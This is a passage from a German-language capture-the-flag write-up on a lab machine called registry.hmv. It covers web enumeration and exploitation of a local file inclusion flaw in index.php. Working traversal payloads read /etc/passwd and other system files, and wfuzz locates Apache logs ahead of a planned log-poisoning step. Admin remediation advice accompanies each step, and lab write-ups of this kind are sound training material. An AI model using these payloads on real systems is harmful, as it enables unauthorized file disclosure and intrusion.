                **Bewertung:** Der Nikto-Scan liefert mehrere interessante Ergebnisse. Es fehlen die Sicherheits-Header `X-Frame-Options` und `X-Content-Type-Options`. Es gibt Hinweise auf die Preisgabe der internen IP-Adresse "127.0.1.1" über den `Location`-Header bei Anfragen an `/images` mit HTTP/1.0 (CVE-2000-0649). Die Apache-Version 2.4.52 ist veraltet. Besonders relevant sind die gefundenen Verzeichnislistungen (`Directory indexing found`) für `/css/` und `/images/`. Dies ist eine Fehlkonfiguration, die Einblicke in die Dateistruktur gibt. Die Meldung zu "junk HTTP methods" kann ein Hinweis auf Web Application Firewalls oder andere Schutzmechanismen sein, die versuchen, ungewöhnliche Anfragen zu blockieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze automatisierte Web-Scanner, um schnell eine erste Liste von Schwachstellen zu erhalten. Priorisiere Fehlkonfigurationen wie Verzeichnislistungen oder veraltete Software. Prüfe auf Informationslecks wie interne IP-Adressen.
                <br>**Empfehlung (Admin):** Stelle sicher, dass alle Webserver wichtige Sicherheits-Header setzen. Behebe Verzeichnislistungen (mittels Webserver-Konfiguration oder `.htaccess` mit `Options -Indexes`). Halte Webserver-Software immer auf dem neuesten Stand. Konfiguriere den Server so, dass er keine internen IPs preisgibt.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://registry.hmv</span></div>
                </div>
                <div class="terminal">
                    <pre>- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="password">192.168.2.51</span>
+ Target Hostname:    <span class="command">192.168.2.51</span>
+ Target Port:        <span class="command">80</span>
+ Start Time:         <span class="password">2025-06-17 14:19:24 (GMT2)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "<span class="password">127.0.1.1</span>". See: <span class="command">[Link: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed | Ziel: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed]</span>
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "<span class="password">127.0.1.1</span>". See: <span class="command">[Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649]</span>
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /css/: <span class="password">Directory indexing found.</span>
+ /css/: This might be interesting.
+ /images/: <span class="password">Directory indexing found.</span>
+ 8103 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           <span class="password">2025-06-17 14:19:47 (GMT2)</span> (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Zusätzlich zum Nikto-scan führe ich einen Verzeichnis-Brute-Force-Scan mit `gobuster` auf der Ziel-Website (`http://registry.hmv`) durch. Ich verwende die Option `dir` für den Verzeichnismodus, gebe die URL an, nutze eine große Wortliste (`/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`) und füge eine lange Liste von Dateierweiterungen (`-x`) hinzu, um auch spezifische Dateien zu finden. Ich schließe bestimmte Statuscodes (`-b '503,404,403'`) aus, um Fehlerseiten oder blockierte Zugriffe zu ignorieren, erlaube erweiterte Ergebnisse (`-e`), deaktiviere Fehlermeldungen (`--no-error`) und verwende `-k` um SSL-Fehler zu ignorieren (obwohl hier kein HTTPS verwendet wird).
            </p>
            <p class="evaluation">
                **Bewertung:** Gobuster findet mehrere Verzeichnisse, darunter `/images`, `/css`, `/js`, `/javascript`, `/vendor`, `/fonts`, die mit 301 (Moved Permanently) auf sich selbst umleiten (was auf eine saubere Verzeichnisstruktur hindeutet) und die Top-Level-Dateien `index.php` und `default.php`, die mit 200 (OK) antworten. Die gefundenen Verzeichnisse `/css` und `/images` stimmen mit den Verzeichnislistungen überein, die Nikto gefunden hat. Das Vorhandensein von `.php`-Dateien (`index.php`, `default.php`) bestätigt, dass die Website PHP verwendet. Die Dateierweiterungen im Scan helfen, potenziell interessante Dateien zu finden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Führe immer eine Verzeichnis- und Dateiaufzählung durch, um die Struktur der Webanwendung zu verstehen und versteckte Dateien/Verzeichnisse zu finden. Verwende umfangreiche Wortlisten und verschiedene Dateierweiterungen.
                <br>**Empfehlung (Admin):** Entferne alle Dateien, die nicht zwingend öffentlich zugänglich sein müssen (z.B. alte Backups, Testskripte). Überwache Webserver-Logs auf Anzeichen von Verzeichnis-Scans.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u "http://registry.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
                </div>
                <div class="terminal">
                    <pre>===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
<span class="password">[+] Url:                     http://registry.hmv</span>
<span class="password">[+] Method:                  GET</span>
<span class="password">[+] Threads:                 10</span>
<span class="password">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
<span class="password">[+] Negative Status codes:   503,404,403</span>
<span class="password">[+] User Agent:              gobuster/3.6</span>
<span class="password">[+] Extensions:              db,bat,java,icon,xml,svg,mod,sql,pl,pdf,desc,zip,tar,sh,csv,rtf,bak,pub,crt,c,exe,dll,raw,csh,png,kdbx,old,yaml,doc,accdb,ELF,rar,ps1,diff,php,xlsx,lib,config,ln,docx,py,elf,js.map,phtml,asp,jpg,pem,cgi,rpm,aspx,deb,gz,jpeg,json,exp,mdb,html,conf,eps,pHtml,txt,xls</span>
<span class="password">[+] Expanded:                true</span>
<span class="password">[+] Timeout:                 10s</span>
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://registry.hmv/index.php            (Status: 200) [Size: 5938]</span>
<span class="command">http://registry.hmv/images               (Status: 301) [Size: 313] [--> http://registry.hmv/images/]</span>
<span class="command">http://registry.hmv/default.php          (Status: 200) [Size: 5938]</span>
<span class="command">http://registry.hmv/css                  (Status: 301) [Size: 310] [--> http://registry.hmv/css/]</span>
<span class="command">http://registry.hmv/js                   (Status: 301) [Size: 309] [--> http://registry.hmv/js/]</span>
<span class="command">http://registry.hmv/javascript           (Status: 301) [Size: 317] [--> http://registry.hmv/javascript/]</span>
<span class="command">http://registry.hmv/vendor               (Status: 301) [Size: 313] [--> http://registry.hmv/vendor/]</span>
<span class="command">http://registry.hmv/fonts                (Status: 301) [Size: 312] [--> http://registry.hmv/fonts/]</span>

Total time: 7.854297
Processed Requests: 304
Filtered Requests: 247
Requests/sec.: 38.70492
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich untersuche die Dateinamen `index.php` und `default.php` weiter. Oft verwenden solche Dateinamen Parameter, um dynamische Inhalte zu laden, was auf lokale oder Remote File Inclusion (LFI/RFI) Schwachstellen hindeuten kann. Ich versuche, den Quellcode von `index.php` über den Browser anzusehen (`view-source:`). Der Text zeigt nur ".....", was darauf hindeutet, dass der Quellcode geprüft wurde, aber hier nicht vollständig protokolliert ist. Die Vermutung liegt nahe, dass der Quellcode einen Parameter zeigt, der Dateien inkludiert, z.B. `?page=`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Prüfung des Quellcodes ist essentiell, um Schwachstellen in der Anwendungslogik zu finden. Das Fehlen des vollständigen Quellcodes hier ist unideal, aber die weiteren Schritte im Text deuten stark darauf hin, dass eine LFI-Schwachstelle im `page`-Parameter gefunden wurde. LFI-Schwachstellen ermöglichen es einem Angreifer, Dateien vom Zielsystem über die Webanwendung zu lesen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysiere den Quellcode von Webanwendungen (falls zugänglich) oder teste gängige Parameter (`?page=`, `?file=`, `?view=`, `?include=`, etc.) in URLs auf File Inclusion Schwachstellen. Versuche, Systemdateien (`/etc/passwd`) oder Konfigurationsdateien zu inkludieren.
                <br>**Empfehlung (Admin):** Implementiere Input-Validierung für alle Dateinamen oder Pfade, die von der Webanwendung verarbeitet werden. Verwende eine Whitelist von erlaubten Dateinamen anstelle einer Blacklist. Deaktiviere, wenn möglich, die Möglichkeit, externe URLs über Datei-Inklusions-Funktionen zu inkludieren (RFI).
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://registry.hmv/index.php?page=default.php</span>
 .....
...</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste die vermutete LFI-Schwachstelle im `page`-Parameter von `index.php` indem ich versuche, die Systemdatei `/etc/passwd` zu inkludieren. Ich verwende die URL `http://registry.hmv/index.php?page=../../../../../../../etc/passwd`. Die Kette von `../` dient dazu, aus dem aktuellen Webverzeichnis in das Root-Dateisystem zu navigieren.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Meldung "hier ist alles leer, ich denke weil der server auf meine anfrage reagiert hat aber konflikte beim anzeigen entstanden sind" deutet darauf hin, dass die Anfrage vom Server verarbeitet wurde, aber die Ausgabe leer war oder einen Fehler enthielt, der nicht protokolliert wurde. Dies ist oft ein positives Zeichen bei LFI-Tests; es bedeutet, dass der Server versucht hat, die Datei zu inkludieren. Manchmal liegt es an der Anzahl der `../` oder an der Art der Zieldatei.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn ein LFI-Versuch keine Ausgabe liefert, versuche verschiedene Pfade (`../`, `....//`, URL-Kodierung) und verschiedene Zielsystemdateien (`/etc/passwd`, `/etc/hosts`, Log-Dateien). Manchmal blockieren WAFs oder Servereinstellungen bestimmte Muster oder Dateinamen.
                <br>**Empfehlung (Admin):** Implementiere eine WAF, die bekannte LFI-Muster erkennt und blockiert.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://registry.hmv/index.php?page=....//....//....//....//....//....//....///etc/passwd</span>
hier ist alles leer, ich denke weil der server auf meine anfrage reagiert hat
aber konflikte beim anzeigen entstanden sind</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich versuche eine leicht modifizierte LFI-Payload-Struktur: `file:///....//....//....//....//....//....//....//etc/passwd`. Die Verwendung des `file:///` Protokolls und einer anderen Anzahl/Struktur von Verzeichnis-Durchläufen (`....//` statt `../`) kann manchmal Firewalls oder unzureichende Filter umgehen.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch! Diese modifizierte LFI-Payload funktioniert und die Ausgabe zeigt den **kompletten Inhalt der `/etc/passwd` Datei**! Dies bestätigt eine funktionierende Local File Inclusion-Schwachstelle. Ich kann nun beliebige Dateien auf dem Dateisystem lesen, auf die der Webserver-Benutzer (`www-data`) Zugriff hat. Die `/etc/passwd` Datei listet alle Benutzerkonten auf dem System auf (root, daemon, www-data, gato, user, cxdxnt etc.).
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Experimentiere mit verschiedenen LFI-Payloads (Nullbytes, Kodierungen, Wrappern wie `php://filter`, verschiedene Traversalschemata wie `....//`), wenn die offensichtlichsten nicht funktionieren. Erfolgreiche LFI ist eine kritische Schwachstelle.
                <br>**Empfehlung (Admin):** Behebe LFI-Schwachstellen umgehend. Überprüfe den Code, der Benutzereingaben zur Dateiinclusion verwendet, sehr sorgfältig.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///etc/passwd</span>

<span class="command">root:x:0:0:root:/root:/bin/bash</span>
<span class="command">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="command">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="command">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="command">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="command">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="command">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="command">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="command">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="command">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
<span class="command">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
<span class="command">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
<span class="command">www-data:x:33:33:www-data:/var/www:/bin/bash</span>
<span class="command">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
<span class="command">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
<span class="command">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span>
<span class="command">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
<span class="command">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
<span class="command">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span>
<span class="command">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span>
<span class="command">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span>
<span class="command">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span>
<span class="command">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span>
<span class="command">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span>
<span class="command">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span>
<span class="command">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span>
<span class="command">gato:x:1000:1000:gato:/home/gato:/bin/bash</span>
<span class="command">uuidd:x:108:112::/run/uuidd:/usr/sbin/nologin</span>
<span class="command">user:x:1001:1001::/home/user:/bin/bash</span>
<span class="command">cxdxnt:x:1002:1002::/home/cxdxnt:/bin/bash</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um die Benutzerkonten mit einer interaktiven Shell (`/bin/bash`) von den Systemkonten zu unterscheiden, filtere ich die `/etc/passwd`-Ausgabe mit `grep sh`. Der `sh`-Eintrag am Ende einer Zeile in `/etc/passwd` zeigt an, dass der Benutzer eine Shell hat, typischerweise `/bin/bash` oder `/bin/sh`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die gefilterte Ausgabe listet die Benutzer `root`, `www-data`, `gato`, `user` und `cxdxnt` als Benutzer mit einer interaktiven Shell auf. Dies sind die primären Benutzerkonten, auf die ich mich für Privilege Escalation-Versuche konzentrieren sollte. Das `sshd` Konto hat auch `/usr/sbin/nologin`, was bedeutet, dass es sich nicht interaktiv anmelden kann.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Filtere `/etc/passwd` nach Benutzern mit interaktiven Shells, um potenzielle Ziele für Brute-Force, Passwort-Wiederverwendung oder Key-basierte Angriffe zu identifizieren.
                <br>**Empfehlung (Admin):** Weise Systemkonten (`www-data`, `sshd` etc.) `nologin` Shells zu, wenn sie keine interaktive Anmeldung benötigen, um das Risiko zu reduzieren. Stelle sicher, dass nur notwendige Benutzerkonten mit interaktiven Shells existieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///etc/passwd -s | grep sh</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">root:x:0:0:root:/root:/bin/bash</span>
<span class="command">www-data:x:33:33:www-data:/var/www:/bin/bash</span>
<span class="command">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span>
<span class="command">gato:x:1000:1000:gato:/home/gato:/bin/bash</span>
<span class="command">user:x:1001:1001::/home/user:/bin/bash</span>
<span class="command">cxdxnt:x:1002:1002::/home/cxdxnt:/bin/bash</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der LFI-Schwachstelle versuche ich, die öffentlichen SSH-Schlüssel (`id_rsa.pub`) der identifizierten Benutzer (`gato`, `user`, `cxdxnt`) aus ihren Home-Verzeichnissen (`/home/<user>/.ssh/`) zu lesen. Öffentliche Schlüssel sind oft über das Web lesbar und können Hinweise auf private Schlüssel geben, oder das Vorhandensein eines Schlüssels kann für weitere Angriffe relevant sein. Ich verwende die `file://` LFI-Payload-Struktur mit der entsprechenden Anzahl von `../` und den Pfad zur `.ssh/id_rsa.pub` Datei für jeden Benutzer.
            </p>
            <p class="evaluation">
                **Bewertung:** Keiner der Versuche, die öffentlichen SSH-Schlüssel zu lesen, liefert eine Ausgabe ("keine ausgabe auch nicht bei id_rsa"). Dies bedeutet, dass diese Dateien entweder nicht existieren, nicht lesbar sind (was bei `.ssh` Dateien Standard sein sollte, aber LFI läuft als `www-data`, der eingeschränkte Rechte hat), oder durch die LFI-Schwachstelle nicht inkludiert werden können (z.B. wegen Blockierung von versteckten Dateien). Dies ist eine Sackgasse für diesen spezifischen Ansatz der PE.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn der Versuch fehlschlägt, private/öffentliche Schlüssel über LFI zu lesen, schließe nicht sofort aus, dass sie existieren. Es kann an Berechtigungen oder Filtern liegen. Probiere, andere Dateien im selben Verzeichnis zu lesen oder andere PE-Vektoren zu verfolgen.
                <br>**Empfehlung (Admin):** Stelle sicher, dass `.ssh`-Verzeichnisse und deren Inhalte restriktive Dateiberechtigungen haben (`chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/*`). Konfiguriere Webserver so, dass sie Anfragen an versteckte Dateien (beginnend mit einem Punkt) in Home-Verzeichnissen blockieren.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///home//gato//.ssh/id_rsa.pub</span>
<span class="command">view-source:http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///home//user//.ssh/id_rsa.pub</span>
<span class="command">view-source:http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///home//cxdxnt//.ssh/id_rsa.pub</span>

keine ausgabe auch nicht bei id_rsa</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste den `php://filter` Wrapper mit Base64-Kodierung, um den Quellcode von `index.php` selbst zu lesen. Dies ist eine gängige Technik, um den Quellcode von Dateien zu erhalten, die LFI-Schwachstellen haben, wenn die direkte Inklusion nicht funktioniert oder die Ausgabe im Browser unsauber ist. Die URL lautet `http://registry.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php`.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Versuch, den Quellcode von `index.php` mit `php://filter` zu lesen, liefert keine Ausgabe. Dies kann verschiedene Gründe haben: Der Wrapper ist blockiert, die Datei ist leer, oder es gibt ein anderes Problem mit der Inklusion. Dies ist eine weitere Sackgasse für diesen spezifischen LFI-Ausnutzungsversuch.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn direkte LFI nicht zum Lesen von Quellcode führt, versuche Wrapper wie `php://filter` oder `php://data`. Sei dir bewusst, dass auch Wrapper blockiert sein können.
                <br>**Empfehlung (Admin):** Deaktiviere potenziell gefährliche PHP-Wrapper (`allow_url_include=Off`, `allow_url_fopen=Off` in `php.ini`), wenn sie nicht benötigt werden. Implementiere eine WAF, die Versuche, solche Wrapper auszunutzen, erkennt und blockiert.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://registry.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php</span>
keine ausgabe</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um das Potenzial der LFI-Schwachstelle weiter auszuloten und potenziell eine Remote Code Execution (RCE) zu erreichen, nutze ich das Tool `wfuzz` für einen kombinierten LFI- und Log-Poisoning-Test. Ich verwende eine Wortliste, die gängige Log-Dateipfade enthält (`/usr/share/wordlists/logfiles.txt`), und verwende diese als `FUZZ` Payload in der LFI-URL: `http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....//FUZZ`. Ich schließe 404-Fehler und Antworten mit 0 Chars Header-Länge aus (`--hc 404 --hh 0`). Das Ziel ist, Log-Dateien zu finden, die ich über LFI inkludieren kann. Wenn ich Schreibzugriff auf eine dieser Log-Dateien habe, könnte ich PHP-Code dort einschleusen (Log Poisoning) und diesen Code dann über LFI ausführen lassen.
            </p>
            <p class="evaluation">
                **Bewertung:** Wfuzz findet zahlreiche Log-Dateien, die über LFI erfolgreich inkludiert werden können (Status 200). Dazu gehören `/etc/passwd` (was ich bereits manuell gefunden hatte), verschiedene `/proc/` Dateien, `/var/log/dpkg.log`, `/var/log/lastlog`, `/var/log/faillog`, `/var/log/wtmp`, `/var/run/utmp`, Apache-Konfigurationsdateien und vor allem die Apache-Log-Dateien: `/var/log/apache2/error.log` und `/var/log/apache2/access.log`. Das Finden der Apache-Log-Dateien, auf die der Webserver schreibt, ist **entscheidend** für einen Log-Poisoning-Angriff. Wenn ich meinen PHP-Payload in eine dieser Dateien schreiben kann, kann ich ihn über die LFI-Schwachstelle ausführen lassen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Tools wie Wfuzz mit Wortlisten, um LFI-Schwachstellen systematisch zu prüfen und inkludierbare Dateien zu finden. Priorisiere Log-Dateien, Konfigurationsdateien oder Dateien, die von Benutzern kontrolliert werden könnten.
                <br>**Empfehlung (Admin):** Stelle sicher, dass Webserver-Log-Dateien nicht für den Webserver-Benutzer lesbar sind. Überwache Webserver-Logs auf Anzeichen von LFI-Scans (z.B. viele Anfragen an `index.php` mit Dateipfaden als Parameter).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u "http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....//FUZZ"  --hc 404 --hh 0</span></div>
                </div>
                <div class="terminal">
                    <pre>===============================================================
Wfuzz v2.4.5
---------------------------------------------------------------
ID           Response   Lines    Word       Chars       Payload
---------------------------------------------------------------
000000001:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000000025:   <span class="command">200</span>        10 L     57 W       411 Ch      "/etc/hosts.allow"
000000024:   <span class="command">200</span>        9 L      25 W       223 Ch      "/etc/hosts"
000000018:   <span class="command">200</span>        12 L     90 W       657 Ch      "/etc/fstab"
000000005:   <span class="command">200</span>        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000000026:   <span class="command">200</span>        17 L     111 W      711 Ch      "/etc/hosts.deny"
000000070:   <span class="command">200</span>        27 L     97 W       582 Ch      "/etc/profile"
000000055:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000000047:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
000000045:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
000000053:   <span class="command">200</span>        2 L      12 W       91 Ch       "/etc/networks"
000000048:   <span class="command">200</span>        25 L     150 W      1833 Ch     "/etc/mtab"
000000044:   <span class="command">200</span>        4 L      6 W        104 Ch      "/etc/lsb-release"
000000038:   <span class="command">200</span>        10 L     41 W       396 Ch      "/etc/issue"
000000086:   <span class="command">200</span>        1 L      3 W        603 Ch      "/etc/ssh/ssh_host_dsa_key.pub"
000000084:   <span class="command">200</span>        122 L    387 W      3237 Ch     "/etc/ssh/sshd_config"
000000080:   <span class="command">200</span>        23 L     142 W      931 Ch      "/etc/resolv.conf"
000000083:   <span class="command">200</span>        53 L     220 W      1650 Ch     "/etc/ssh/ssh_config"
000000109:   <span class="command">200</span>        71 L     426 W      3685 Ch     "/proc/modules"
000000105:   <span class="command">200</span>        32 L     57 W       385 Ch      "/proc/filesystems"
000000108:   <span class="command">200</span>        50 L     146 W      1391 Ch     "/proc/meminfo"
000000113:   <span class="command">200</span>        1 L      23 W       186 Ch      "/proc/version"
000000107:   <span class="command">200</span>        53 L     173 W      1338 Ch     "/proc/ioports"
000000112:   <span class="command">200</span>        2 L      10 W       100 Ch      "/proc/swaps"
000000110:   <span class="command">200</span>        25 L     150 W      1833 Ch     "/proc/mounts"
000000111:   <span class="command">200</span>        10 L     497 W      1183 Ch      "/proc/stat"
000000114:   <span class="command">200</span>        4 L      27 W       316 Ch      "/proc/self/net/arp"
000000104:   <span class="command">200</span>        56 L     358 W      2036 Ch      "/proc/cpuinfo"
000000106:   <span class="command">200</span>        32 L     180 W      1733 Ch      "/proc/interrupts"
000000181:   <span class="command">200</span>        9695 L   57650 W    684662 Ch   "/var/log/dpkg.log"
000000199:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000000188:   <span class="command">200</span>        0 L      1 W        32096 Ch    "/var/log/faillog"
000000224:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000004866:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000005079:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000005081:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
000005080:   <span class="command">200</span>        9 L      25 W       223 Ch      "/etc/hosts"
000005075:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000005060:   <span class="command">200</span>        57 L     139 W      1380 Ch     "/proc/self/status"
000005059:   <span class="command">200</span>        1 L      52 W       323 Ch      "/proc/self/stat"
000005058:   <span class="command">200</span>        0 L      1 W        27 Ch       "/proc/self/cmdline"
000005088:   <span class="command">200</span>        1 L      3 W        80 Ch       "/proc/cmdline"
000005082:   <span class="command">200</span>        10 L     41 W       396 Ch      "/etc/issue"
000005095:   <span class="command">200</span>        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000005109:   <span class="command">200</span>        122 L    387 W      3237 Ch     "/etc/ssh/sshd_config"
000005087:   <span class="command">200</span>        1 L      23 W       186 Ch      "/proc/version"
000005162:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000005161:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000005160:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000005205:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000005206:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000005207:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000005250:   <span class="command">200</span>        57 L     139 W      1378 Ch     "/proc/self/status"
000005249:   <span class="command">200</span>        1 L      52 W       323 Ch      "/proc/self/stat"
000005248:   <span class="command">200</span>        0 L      1 W        27 Ch       "/proc/self/cmdline"
000005271:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000005302:   <span class="command">200</span>        122 L    387 W      3237 Ch     "/etc/ssh/sshd_config"
000005288:   <span class="command">200</span>        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000005280:   <span class="command">200</span>        1 L      3 W        80 Ch       "/proc/cmdline"
000005279:   <span class="command">200</span>        1 L      23 W       186 Ch      "/proc/version"
000005274:   <span class="command">200</span>        10 L     41 W       396 Ch      "/etc/issue"
000005273:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
000005272:   <span class="command">200</span>        9 L      25 W       223 Ch      "/etc/hosts"
000005267:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000005355:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000005354:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000005353:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000005400:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000005399:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000005398:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000005446:   <span class="command">200</span>        57 L     139 W      1378 Ch     "/proc/self/status"
000005445:   <span class="command">200</span>        1 L      52 W       323 Ch      "/proc/self/stat"
000005444:   <span class="command">200</span>        0 L      1 W        27 Ch       "/proc/self/cmdline"
000005801:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000005799:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000005798:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000005797:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
